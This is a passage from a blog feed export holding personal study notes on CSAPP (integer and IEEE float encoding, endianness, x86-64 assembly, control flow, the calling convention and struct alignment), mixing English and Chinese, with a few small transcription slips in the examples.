<h3 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h3><p>假设页面大小是 <code>B</code>。 每步进一次，原子的高度减半。这样 B 和原子的关系就构建出来了，无论 <code>B</code> 是多大，只要每次我们使得得到的 原子群 高度为 O(logB) 即可，这样他就可以塞进一页(2^(logB) &#x3D; B)当中去。</p>
<p>现在来算下搜索复杂度：它会首先遍历第一个 <code>atom</code> 子树，直到遍历完该子树的所有节点，然后继续使用相同的遍历去遍历下一个 <code>atom</code> 子树，每次这样的遍历花费 <code>O(logB)</code> 次步进，然后未划分子树前我们知道整棵大树需要 <code>O(logN)</code> 次遍历，所以我们可以算出来一共有 <code>O(logN / logB) = O(log[B]N)</code> 个 <code>atom</code>，这个数量也同时就是我们需要 <code>access page</code> 的次数。</p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP</title>
    <url>/2020/10/01/csapp/</url>
    <content><![CDATA[<h2 id="Not-be-the-real-thing"><a href="#Not-be-the-real-thing" class="headerlink" title="Not be the real thing"></a>Not be the real thing</h2><ol>
<li><p>digit might be overfolw</p>
</li>
<li><p>float will not be overflow, but could lost precision</p>
</li>
</ol>
<h2 id="Memory"><a href="#Memory" class="headerlink" title="Memory"></a>Memory</h2><ol>
<li>RAM: Random am</li>
</ol>
<h2 id="Bit"><a href="#Bit" class="headerlink" title="Bit"></a>Bit</h2><p>Exclusive-Or(XOR)  A ^ B</p>
<p>Union | &#x2F;&#x2F;并</p>
<p>Complement ~ &#x2F;&#x2F;补</p>
<p>Intersection &amp; &#x2F;&#x2F;交</p>
<p>Symmetric difference ^ &#x2F;&#x2F;差</p>
<h2 id="Integer"><a href="#Integer" class="headerlink" title="Integer"></a>Integer</h2><p>Unsigned： </p>
<p>$$ B2U(X)&#x3D;\sum_{i&#x3D;0}^{w-1}x_i*2^i $$</p>
<p>Signed：</p>
<p>$$ B2T(X)&#x3D;-x_{w-1}<em>2^{w-1}+\sum_{i&#x3D;0}^{w-2}x_i</em>2^i $$</p>
<h3 id="Type-Conversion"><a href="#Type-Conversion" class="headerlink" title="Type Conversion"></a>Type Conversion</h3><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/10/01/csapp/unsigned.jpg"
                      class="" title="TypeConversion"
                >

<p>If not set keyword(unsigned) in C, then must use U follow number to change the default value(signed) such as 15213U</p>
<h3 id="Conversion-mutual"><a href="#Conversion-mutual" class="headerlink" title="Conversion mutual"></a>Conversion mutual</h3><ul>
<li><p>Byte will not changed, but change the interpreted way.</p>
</li>
<li><p>Both all will be convert into unsigned if include one unsigned.</p>
</li>
</ul>
<h3 id="Type-extension-amp-Intercept"><a href="#Type-extension-amp-Intercept" class="headerlink" title="Type extension &amp; Intercept"></a>Type extension &amp; Intercept</h3><ul>
<li><p>Extend: from short to int</p>
<ul>
<li>unsigned: plus 0</li>
<li>signed: plus sign</li>
</ul>
</li>
<li><p>Intercept: from unsigned int to unsigned short</p>
<ul>
<li>unsigned: mod operation</li>
<li>signed: almost mod operation</li>
</ul>
</li>
</ul>
<h3 id="Calculate-amp-Overflow"><a href="#Calculate-amp-Overflow" class="headerlink" title="Calculate &amp; Overflow"></a>Calculate &amp; Overflow</h3><p>Both w bit unsigned number mutual plus, and get a result w+1 bit. Then it will lose the highest bit, just like mod operation:</p>
<p>$$s&#x3D;UAdd_w(u,v)&#x3D;u+v ; mod ; 2^w$$</p>
<p>So as signed number, but change the sign symbol.</p>
<h2 id="Float"><a href="#Float" class="headerlink" title="Float"></a>Float</h2><p>$$\sum_{k&#x3D;-j}^ib_k\times 2^k$$</p>
<h3 id="IEEE-standard"><a href="#IEEE-standard" class="headerlink" title="IEEE standard"></a>IEEE standard</h3><p>$$(-1)^s ; M ; 2^E$$</p>
<p><code>s</code> is sign symbol, <code>M</code> always be [1.0, 2.0) decimal, and <code>E</code> is power.</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/10/01/csapp/decimal.jpg"
                      class="" title="decimal"
                >

<p>Exp related E(not equal must, as the limit of bit count), frac related M(So as E)</p>
<hr>
<h4 id="Normalized-Values"><a href="#Normalized-Values" class="headerlink" title="Normalized Values"></a>Normalized Values</h4><p>$$v&#x3D;(-1)^s ; M ; 2^E$$</p>
<ul>
<li>E &#x3D; Exp - Bias</li>
<li>Exp: exp encode area unsigned digit</li>
<li>Bias: as k is exp encode count, which means</li>
</ul>
<p>$$2^{k-1} - 1$$</p>
<pre><code>- single precision: 127 (Exp:1...254,E:-126...127)
- double precision: 1023 (Exp:1...2046, E:-1022...1023)
</code></pre>
<p>Note: Exp encode only need unsigned digit to operate.</p>
<p>For M, it must begin with 1: M &#x3D; 1.xxx…x2, and xxx means frac(frac &#x3D; 000.00 corresponding minium M &#x3D; 1.0), when frac&#x3D;111…1, M will be infinite close to 2.0</p>
<p>For Example: Float F &#x3D; 15213.0</p>
<p>$$15213_{10}&#x3D;11101101101101_2&#x3D;1.1101101101101_2 \times 2^{13}$$</p>
<p>So the frac part is the point behind, and Exp &#x3D; E + Bias &#x3D; 12 + 127 &#x3D; 140 &#x3D; 10001100(b)</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0 10001100 11011011011010000000000</span><br><span class="line">s   exp             frac</span><br></pre></td></tr></table></figure></div>

<h4 id="Denormalized-Values"><a href="#Denormalized-Values" class="headerlink" title="Denormalized Values"></a>Denormalized Values</h4><p><code>E = 1 - Bias</code> And <code>M = 0.xxx...x2</code> But others not changed.</p>
<p>exp &#x3D; 000…0 &amp; frac &#x3D; 000…0 : 0<br>exp &#x3D; 000…0 &amp; frac !&#x3D; 000…0 : infinite to 0<br>exp &#x3D; 111…1 &amp; frac &#x3D; 000..0 infinite<br>exp &#x3D; 111…1 &amp; frac !&#x3D; 000…0 NaN</p>
<h4 id="Real-sample"><a href="#Real-sample" class="headerlink" title="Real sample"></a>Real sample</h4><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/10/01/csapp/normalize.jpg"
                      class="" title="normalize"
                >

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">    s exp  frac   E   值</span><br><span class="line">------------------------------------------------------------------</span><br><span class="line">    0 0000 000   -6   0   # 这部分是非规范化数值，下一部分是规范化值</span><br><span class="line">    0 0000 001   -6   1/8 * 1/64 = 1/512 # 能表示的最接近零的值</span><br><span class="line">    0 0000 010   -6   2/8 * 1/64 = 2/512 </span><br><span class="line">    ...</span><br><span class="line">    0 0000 110   -6   6/8 * 1/64 = 6/512</span><br><span class="line">    0 0000 111   -6   7/8 * 1/64 = 7/512 # 能表示的最大非规范化值</span><br><span class="line">------------------------------------------------------------------</span><br><span class="line">    0 0001 000   -6   8/8 * 1/64 = 8/512 # 能表示的最小规范化值</span><br><span class="line">    0 0001 001   -6   9/8 * 1/64 = 9/512</span><br><span class="line">    ...</span><br><span class="line">    0 0110 110   -1   14/8 * 1/2 = 14/16</span><br><span class="line">    0 0110 111   -1   15/8 * 1/2 = 15/16 # 最接近且小于 1 的值</span><br><span class="line">    0 0111 000    0   8/8 * 1 = 1</span><br><span class="line">    0 0111 001    0   9/8 * 1 = 9/8      # 最接近且大于 1 的值</span><br><span class="line">    0 0111 010    0   10/8 * 1 = 10/8</span><br><span class="line">    ...</span><br><span class="line">    0 1110 110    7   14/8 * 128 = 224</span><br><span class="line">    0 1110 111    7   15/8 * 128 = 240   # 能表示的最大规范化值</span><br><span class="line">------------------------------------------------------------------</span><br><span class="line">    0 1111 000   n/a  无穷               # 特殊值</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>Note: </p>
<ul>
<li>exp &#x3D; 0000(Denormalize) 1&#x2F;8 is the distance</li>
</ul>
<hr>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">  原数值       舍入结果    原因</span><br><span class="line">2.8949999      2.89    不到一半，正常四舍五入</span><br><span class="line">2.8950001      2.90    超过一半，正常四舍五入</span><br><span class="line">2.8950000      2.90    刚好在一半时，保证最后一位是偶数，所以向上舍入</span><br><span class="line">2.8850000      2.88    刚好在一半时，保证最后一位是偶数，所以向下舍入</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">  十进制    二进制     舍入结果  十进制    原因</span><br><span class="line">2 又 3/32  10.00011   10.00     2      不到一半，正常四舍五入</span><br><span class="line">2 又 3/16  10.00110   10.01  2 又 1/4   超过一半，正常四舍五入</span><br><span class="line">2 又 7/8   10.11100   11.00     3      刚好在一半时，保证最后一位是偶数，所以向上舍入</span><br><span class="line">2 又 5/8   10.10100   10.10  2 又 1/2   刚好在一半时，保证最后一位是偶数，所以向下舍入</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>


<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/10/01/csapp/plusmult.jpeg"
                      class="" title="plus&amp;mult"
                >


<h2 id="Data-in-Memory"><a href="#Data-in-Memory" class="headerlink" title="Data in Memory"></a>Data in Memory</h2><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/10/01/csapp/address.jpg"
                      class="" title="address"
                >

<p>Internet: Big Endian</p>
<p>x86 OR ARM: Little Endian</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/10/01/csapp/endian.jpg"
                      class="" title="Endian"
                >

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Check the num format</span><br><span class="line">typedef unsigned char *pointer;</span><br><span class="line">void show_bytes(pointer start, size_t len) &#123;</span><br><span class="line">	size_t i;</span><br><span class="line">	for (i = 0; i &lt; len; i++)</span><br><span class="line">		printf(&quot;%p\t0x%.2x\n&quot;, start+i, start[i]);</span><br><span class="line">	printf(&quot;\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>%p: point, %x: Hex, Execute as:</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">int a = 15213;</span><br><span class="line">printf(&quot;int a = 15213;\n&quot;);</span><br><span class="line">show_bytes((pointer) &amp;a, sizeof(int));</span><br></pre></td></tr></table></figure></div>



<hr>
<h2 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h2><h3 id="C2M"><a href="#C2M" class="headerlink" title="C2M"></a>C2M</h3><p>.c (gcc -0g 0S) -&gt; .s<br>.s (gcc OR as) -&gt; .o<br>.o (with lib.a operated by gcc OR ld) execute.</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">plus</span><span class="params">(<span class="type">long</span> x, <span class="type">long</span> y)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">sumstore</span><span class="params">(<span class="type">long</span> x, <span class="type">long</span> y, <span class="type">long</span> *dest)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> t = plus(x, y);</span><br><span class="line">    *dest = t;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>appropriate code:</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sumstore:</span><br><span class="line">    pushq   %rbx</span><br><span class="line">    movq    %rbx, %rbx</span><br><span class="line">    call    plus</span><br><span class="line">    movq    %rax, (%rbx)</span><br><span class="line">    popq    %rbx</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure></div>

<hr>
<p>Processor: </p>
<ul>
<li>Storage: Memory &amp; Register</li>
<li>Calc: Memory &amp; Register</li>
<li>Transfer: condition call OR condition branch</li>
</ul>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// C 代码</span><br><span class="line">*dest = t;</span><br><span class="line">// 对应的汇编代码</span><br><span class="line">movq    %rax, (%rbx)</span><br><span class="line">// 对应的对象代码</span><br><span class="line">0x40059e:   46 89 03</span><br></pre></td></tr></table></figure></div>

<h3 id="Assembly"><a href="#Assembly" class="headerlink" title="Assembly"></a>Assembly</h3><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/10/01/csapp/x86_64.jpg"
                      class="" title="x86_64"
                >

<p>General purpose register</p>
<ul>
<li>%rax(%eax) 用于做累加</li>
<li>%rcx(%ecx) 用于计数</li>
<li>%rdx(%edx) 用于保存数据</li>
<li>%rbx(%ebx) 用于做内存查找的基础地址</li>
<li>%rsi(%esi) 用于保存源索引值</li>
<li>%rdi(%edi) 用于保存目标索引值</li>
</ul>
<hr>
<p><em>%rsp(%esp) 和 %rbp(%ebp) 则是作为栈指针和基指针来使用的</em></p>
<hr>
<p>movq Sour:[Imm|Reg|Mem], Dest[Reg|Mem] (But No Mem Mem)</p>
<p><code>D(Rb, Ri, S) -&gt; Mem[Reg[Rb]+S*Reg[Ri]+D]</code></p>
<ul>
<li><p>D - 常数偏移量</p>
</li>
<li><p>Rb - 基寄存器</p>
</li>
<li><p>Ri - 索引寄存器，不能是 %rsp</p>
</li>
<li><p>S - 系数</p>
</li>
<li><p>(Rb, Ri) -&gt; Mem[Reg[Rb]+Reg[Ri]]</p>
</li>
<li><p>D(Rb, Ri) -&gt; Mem[Reg[Rb]+Reg[Ri]+D]</p>
</li>
<li><p>(Rb, Ri, S) -&gt; Mem[Reg[Rb]+S*Reg[Ri]]</p>
</li>
</ul>
<hr>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">long m12(long x)</span><br><span class="line">&#123;</span><br><span class="line">    return x * 12;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">leaq (%rdi, %rdi, 2), %rax # t &lt;- x+x*2</span><br><span class="line">salq $2, %rax              # return t &lt;&lt; 2</span><br></pre></td></tr></table></figure></div>

<p>More orders:</p>
<ul>
<li><p>addq Src, Dest -&gt; Dest &#x3D; Dest + Src</p>
</li>
<li><p>subq Src, Dest -&gt; Dest &#x3D; Dest - Src</p>
</li>
<li><p>imulq Src, Dest -&gt; Dest &#x3D; Dest * Src</p>
</li>
<li><p>salq Src, Dest -&gt; Dest &#x3D; Dest &lt;&lt; Src</p>
</li>
<li><p>sarq Src, Dest -&gt; Dest &#x3D; Dest &gt;&gt; Src</p>
</li>
<li><p>shrq Src, Dest -&gt; Dest &#x3D; Dest &gt;&gt; Src</p>
</li>
<li><p>xorq Src, Dest -&gt; Dest &#x3D; Dest ^ Src</p>
</li>
<li><p>andq Src, Dest -&gt; Dest &#x3D; Dest &amp; Src</p>
</li>
<li><p>orq Src, Dest -&gt; Dest &#x3D; Dest | Src</p>
</li>
<li></li>
<li><p>incq Dest -&gt; Dest &#x3D; Dest + 1</p>
</li>
<li><p>decq Dest -&gt; Dest &#x3D; Dest - 1</p>
</li>
<li><p>negq Dest -&gt; Dest &#x3D; -Dest</p>
</li>
<li><p>notq Dest -&gt; Dest &#x3D; ~Dest</p>
</li>
</ul>
<h2 id="Flow-Control"><a href="#Flow-Control" class="headerlink" title="Flow Control"></a>Flow Control</h2><ul>
<li>临时数据存放在 (%rax, …)</li>
<li>运行时栈的地址存储在 (%rsp) 中</li>
<li>目前的代码控制点存储在 (%rip, …) 中</li>
<li>目前测试的状态放在 CF, ZF, SF, OF 中</li>
</ul>
<h3 id="Condition-amp-Jump"><a href="#Condition-amp-Jump" class="headerlink" title="Condition &amp; Jump"></a>Condition &amp; Jump</h3><ul>
<li>CF: Carry Flag (针对无符号数)</li>
<li>ZF: Zero Flag</li>
<li>SF: Sign Flag (针对有符号数)</li>
<li>OF: Overflow Flag (针对有符号数)</li>
</ul>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">long absdiff(long x, long y)</span><br><span class="line">&#123;</span><br><span class="line">    long result;</span><br><span class="line">    if (x &gt; y)</span><br><span class="line">        result = x-y;</span><br><span class="line">    else</span><br><span class="line">        result = y-x;</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p> %rdi save x，%rsi save y， %rax save return.</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">absdiff:</span><br><span class="line">    cmpq    %rsi, %rdi</span><br><span class="line">    jle     .L4</span><br><span class="line">    movq    %rdi, %rax</span><br><span class="line">    subq    %rsi, %rax</span><br><span class="line">    ret</span><br><span class="line">.L4:    # x &lt;= y</span><br><span class="line">    movq    %rsi, %rax</span><br><span class="line">    subq    %rdi, %rax</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure></div>


<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">long absdiff_goto(long x, long y)</span><br><span class="line">&#123;</span><br><span class="line">    long result;</span><br><span class="line">    int ntest = x &lt;= y;</span><br><span class="line">    if (ntest) goto Else;</span><br><span class="line">    result = x-y;</span><br><span class="line">    goto Done;</span><br><span class="line">Else:</span><br><span class="line">    result = y-x;</span><br><span class="line">Done:</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">val = Test ? Then_Expr : Else_Expr;</span><br><span class="line">val = x&gt;y ? x-y : y-x;</span><br></pre></td></tr></table></figure></div>

<p>To Goto</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">	ntest = !Test;</span><br><span class="line">	if (ntest) goto Else;</span><br><span class="line">	value = Then_Expr;</span><br><span class="line">	goto Done;</span><br><span class="line">Else:</span><br><span class="line">	val = Else_Expr;</span><br><span class="line">Done:</span><br><span class="line">	...</span><br></pre></td></tr></table></figure></div>

<p>Calc all to avoid the reset assembly line operation</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">result = Then_Expr;</span><br><span class="line">eval = Else_Expr;</span><br><span class="line">nt = !Test;</span><br><span class="line">if (nt) result = eval;</span><br><span class="line">return result;</span><br></pre></td></tr></table></figure></div>

<p>Such as:</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">absdiff:</span><br><span class="line">    movq    %rdi, %rax  # x</span><br><span class="line">    subq    %rsi, %rax  # result = x-y</span><br><span class="line">    movq    %rsi, %rdx</span><br><span class="line">    subq    %rdi, %rdx  # eval = y-x</span><br><span class="line">    cmpq    %rsi, %rdi  # x:y</span><br><span class="line">    cmovle  %rdx, %rax  # if &lt;=, result = eval</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure></div>

<p>Not suited:</p>
<ul>
<li><p>Much more calc in the two branches</p>
</li>
<li><p><code>val = p ? *p : 0;</code> some interesting happen</p>
</li>
<li><p><code>val = x &gt; 0? x *= 7: x *= 3</code> x will change</p>
</li>
</ul>
<h4 id="Do-While"><a href="#Do-While" class="headerlink" title="Do While"></a>Do While</h4><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Do While 的 C 语言代码</span><br><span class="line">long pcount_do(unsigned long x)</span><br><span class="line">&#123;</span><br><span class="line">    long result = 0;</span><br><span class="line">    do &#123;</span><br><span class="line">        result += x &amp; 0x1;</span><br><span class="line">        x &gt;&gt;= 1;</span><br><span class="line">    &#125; while (x);</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br><span class="line">// Goto 版本</span><br><span class="line">long pcount_goto(unsigned long x)</span><br><span class="line">&#123;</span><br><span class="line">    long result = 0;</span><br><span class="line">loop:</span><br><span class="line">    result += x &amp; 0x1;</span><br><span class="line">    x &gt;&gt;= 1;</span><br><span class="line">    if (x) goto loop;</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>To assembly:</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">    movl    $0, %eax    # result = 0</span><br><span class="line">.L2:                    # loop:</span><br><span class="line">    movq    %rdi, %rdx</span><br><span class="line">    andl    $1, %edx    # t = x &amp; 0x1</span><br><span class="line">    addq    %rdx, %rax  # result += t</span><br><span class="line">    shrq    %rdi        # x &gt;&gt;= 1</span><br><span class="line">    jne     .L2         # if (x) goto loop</span><br><span class="line">    rep; ret</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// C Code</span><br><span class="line">do</span><br><span class="line">	Body</span><br><span class="line">	while (Test);</span><br><span class="line">// Goto Version</span><br><span class="line">loop:</span><br><span class="line">	Body</span><br><span class="line">	if (Test)</span><br><span class="line">		goto loop</span><br><span class="line"></span><br><span class="line">// C While version</span><br><span class="line">while (Test)</span><br><span class="line">	Body</span><br><span class="line">// Goto Version</span><br><span class="line">	goto test;</span><br><span class="line">loop:</span><br><span class="line">	Body</span><br><span class="line">test:</span><br><span class="line">	if (Test)</span><br><span class="line">		goto loop;</span><br><span class="line">done:</span><br></pre></td></tr></table></figure></div>

<p>Turn on <code>-01</code> Optimize option, <code>While</code> will be transfer into Do-While, then transfer into Goto, Because Do-While execute so faster, which much more suit CPU calc model.</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// For</span><br><span class="line">for (Init; Test; Update)</span><br><span class="line">	Body</span><br><span class="line">	</span><br><span class="line">// While Version</span><br><span class="line">Init;</span><br><span class="line">while (Test) &#123;</span><br><span class="line">	Body</span><br><span class="line">	Update;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>Switch:</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">long switch_eg (long x, long y, long z)&#123;</span><br><span class="line">	long w = 1;</span><br><span class="line">	switch (x) &#123;</span><br><span class="line">		case 1:</span><br><span class="line">			w = y*z;</span><br><span class="line">			break;</span><br><span class="line">		case 2:</span><br><span class="line">			w = y/z;</span><br><span class="line">			// fall through</span><br><span class="line">		case 3:</span><br><span class="line">			w += z;</span><br><span class="line">			break;</span><br><span class="line">		case 5:</span><br><span class="line">		case 6:</span><br><span class="line">			w -= z;</span><br><span class="line">			break;</span><br><span class="line">		default:</span><br><span class="line">			w = 2;</span><br><span class="line">	&#125;</span><br><span class="line">	return w;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>We will use jump table:<br>%rdi is x, %rsi is y, %rdx is z, %rax is return</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">switch_eg:</span><br><span class="line">    movq    %rdx, %rcx</span><br><span class="line">    cmpq    $6, %rdi    # x:6</span><br><span class="line">    ja      .L8</span><br><span class="line">    jmp     *.L4(, %rdi, 8)</span><br><span class="line"></span><br><span class="line">--------------</span><br><span class="line">Jump table as</span><br><span class="line">--------------</span><br><span class="line"></span><br><span class="line">.section    .rodata</span><br><span class="line">    .align 8</span><br><span class="line">.L4:</span><br><span class="line">    .quad   .L8 # x = 0</span><br><span class="line">    .quad   .L3 # x = 1</span><br><span class="line">    .quad   .L5 # x = 2</span><br><span class="line">    .quad   .L9 # x = 3</span><br><span class="line">    .quad   .L8 # x = 4</span><br><span class="line">    .quad   .L7 # x = 5</span><br><span class="line">    .quad   .L7 # x = 6</span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/10/01/csapp/switch.png"
                      class="" title="switch"
                > 

<h2 id="Process-call"><a href="#Process-call" class="headerlink" title="Process call"></a>Process call</h2><ul>
<li>Delivery Control: How to begin, and return back the begin</li>
<li>Delivery Data: Args and return value.</li>
<li>Memory Manage: How to free and malloc memory.</li>
</ul>
<h3 id="Stack-Structure"><a href="#Stack-Structure" class="headerlink" title="Stack Structure"></a>Stack Structure</h3><p>%rsp is stack point</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/10/01/csapp/stackp.jpg"
                      class="" title="stackp"
                >

<h3 id="Call-ways"><a href="#Call-ways" class="headerlink" title="Call ways"></a>Call ways</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// multstore 函数</span><br><span class="line">void multstore (long x, long, y, long *dest)</span><br><span class="line">&#123;</span><br><span class="line">    long t = mult2(x, y);</span><br><span class="line">    *dest = t;</span><br><span class="line">&#125;</span><br><span class="line">// mult2 函数</span><br><span class="line">long mult2(long a, long b)</span><br><span class="line">&#123;</span><br><span class="line">    long s = a * b;</span><br><span class="line">    return s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// Assembly</span><br><span class="line">0000000000400540 &lt;multstore&gt;:</span><br><span class="line">    # x 在 %rdi 中，y 在 %rsi 中，dest 在 %rdx 中</span><br><span class="line">    400540: push    %rbx            # 通过压栈保存 %rbx</span><br><span class="line">    400541: mov     %rdx, %rbx      # 保存 dest</span><br><span class="line">    400544: callq   400550 &lt;mult2&gt;  # 调用 mult2(x, y)</span><br><span class="line">    # t 在 %rax 中</span><br><span class="line">    400549: mov     %rax, (%rbx)    # 结果保存到 dest 中</span><br><span class="line">    40054c: pop     %rbx            # 通过出栈恢复原来的 %rbx</span><br><span class="line">    40054d: retq                    # 返回</span><br><span class="line">0000000000400550 &lt;mult2&gt;:</span><br><span class="line">    # a 在 %rdi 中，b 在 %rsi 中</span><br><span class="line">    400550: mov     %rdi, %rax      # 得到 a 的值</span><br><span class="line">    400553: imul    %rsi, %rax      # a * b</span><br><span class="line">    # s 在 %rax 中</span><br><span class="line">    400557: retq                    # 返回</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<p>call: 将当前的IP 或者 CS:IP 压入栈中, 跳转到指定位置<br>ret :  用栈中所保存的数据赋值给IP的， 跳转回来</p>
<hr>
<p>参数没有超过六个，那么会放在：%rdi, %rsi, %rdx, %rcx, %r8, %r9 中。</p>
<p>如果超过了，会另外放在一个栈中。而返回值会放在 %rax 中</p>
<p>A Frame will be assigned to every call process by on stack which include three as follows:</p>
<ul>
<li>返回信息</li>
<li>本地存储（如果需要）</li>
<li>临时空间（如果需要）</li>
</ul>
<p>Call then alloc, free when return.</p>
<hr>
<p>x86_64&#x2F;Linux, fixed in that:</p>
<ul>
<li>Argument Build: 需要使用的参数</li>
<li>如果不能保存在寄存器中，会把一些本地变量放在这里</li>
<li>已保存的寄存器上下文</li>
<li>老的栈帧的指针（可选）</li>
</ul>
<p>While caller include:</p>
<ul>
<li>返回地址（因为 call 指令被压入栈的）</li>
<li>调用所需的参数</li>
</ul>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/10/01/csapp/frame.jpg"
                      class="" title="frame"
                >


<h4 id="Recursive"><a href="#Recursive" class="headerlink" title="Recursive"></a>Recursive</h4><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">long pcount_r(unsigned long x) &#123;</span><br><span class="line">	if (x == 0)</span><br><span class="line">		return 0;</span><br><span class="line">	else</span><br><span class="line">		return (x &amp; 1) + pcount_r(x &gt;&gt; 1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pcount_r:</span><br><span class="line">    mov     $0, %eax</span><br><span class="line">    testq   %rdi, %rdi</span><br><span class="line">    je      .L6</span><br><span class="line">    push    %rbx</span><br><span class="line">    movq    %rdi, %rbx</span><br><span class="line">    andl    $1, %ebx</span><br><span class="line">    shrq    %rdi</span><br><span class="line">    call    pcount_r</span><br><span class="line">    addq    %rbx, %rax</span><br><span class="line">    popq    %rbx</span><br><span class="line">.L6:</span><br><span class="line">    rep; ret</span><br></pre></td></tr></table></figure></div>

<h2 id="Data-Storage"><a href="#Data-Storage" class="headerlink" title="Data Storage"></a>Data Storage</h2><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/10/01/csapp/zone.jpg"
                      class="" title="zone"
                >

<p>Struct:</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct rec </span><br><span class="line">&#123;</span><br><span class="line">    int a[4];</span><br><span class="line">    size_t i;       </span><br><span class="line">    struct rect *next;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/10/01/csapp/struct1.jpg"
                      class="" title="struct1"
                >

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct S1</span><br><span class="line">&#123;</span><br><span class="line">    char c;</span><br><span class="line">    int i[2];</span><br><span class="line">    double v;</span><br><span class="line">&#125; *p;</span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/10/01/csapp/struct2.jpg"
                      class="" title="struct2"
                >

<blockquote>
<p>Align theory: </p>
</blockquote>
<blockquote>
<p>Win: 如果数据类型需要 K 个字节，那么地址都必须是 K 的倍数</p>
</blockquote>
<blockquote>
